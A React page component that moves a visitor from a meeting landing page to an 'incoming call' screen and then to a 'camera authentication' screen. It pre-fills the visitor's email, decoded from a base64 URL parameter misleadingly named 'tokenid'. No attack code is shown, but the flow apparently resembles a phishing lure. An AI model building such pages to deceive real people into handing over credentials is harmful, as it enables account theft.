import { useState, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import Phase1Landing from "@/components/Phase1Landing";
import Phase2IncomingCall from "@/components/Phase2IncomingCall";
import Phase3CameraAuth from "@/components/Phase3CameraAuth";
import { decodeEmailFromBase64 } from "@/lib/meetingUtils";

const Index = () => {
  const [currentPhase, setCurrentPhase] = useState<1 | 2 | 3>(1);
  const [prefillEmail, setPrefillEmail] = useState<string>("");
  const [searchParams] = useSearchParams();

  useEffect(() => {
    const encodedEmail = searchParams.get('tokenid');
    if (encodedEmail) {
      const decodedEmail = decodeEmailFromBase64(encodedEmail);
      if (decodedEmail) {
        setPrefillEmail(decodedEmail);
      }
    }
  }, [searchParams]);

  const handlePhase1Complete = () => {
    setCurrentPhase(2);
  };

  const handleAcceptCall = () => {
    setCurrentPhase(3);
  };

  const handleDeclineCall = () => {
    setCurrentPhase(1);
  };

  const handlePhase3Complete = () => {
    // Reset to phase 1 or handle completion
    setCurrentPhase(1);
  };

  if (currentPhase === 1) {
    return <Phase1Landing onJoinMeeting={handlePhase1Complete} />;
  }

  if (currentPhase === 2) {
    return (
      <Phase2IncomingCall 
        onAccept={handleAcceptCall} 
        onDecline={handleDeclineCall} 
      />
    );
  }

  if (currentPhase === 3) {
    return <Phase3CameraAuth onComplete={handlePhase3Complete} prefillEmail={prefillEmail} />;
  }

  return null;
};

export default Index;
